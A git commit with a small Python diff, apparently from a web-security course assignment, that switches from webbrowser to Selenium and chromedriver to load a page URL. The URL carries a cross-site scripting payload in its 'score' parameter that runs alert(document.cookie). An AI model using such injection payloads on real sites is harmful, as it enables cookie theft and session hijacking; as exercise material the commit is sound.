a15dacec00f2e94ae8a090c0bd2a1bafb581caa1
HooDeLin <hoodelin0619@gmail.com>
2018-03-17 22:51:25 +0800

    Case05 using selenium and chromium

--- case05.py
+++ case05.py
@@ -1,5 +1,4 @@
-import webbrowser
-
-url = "http://www.wsb.com/Assignment2/case05.php?score=6%3Balert(document.cookie)"
-new = 2
-webbrowser.open(url, new)
+from selenium import webdriver
+chromium_path = "/usr/lib/chromium-browser/chromedriver"
+driver = webdriver.Chrome(chromium_path)
+driver.get("http://www.wsb.com/Assignment2/case05.php?score=6%3Balert(document.cookie)")
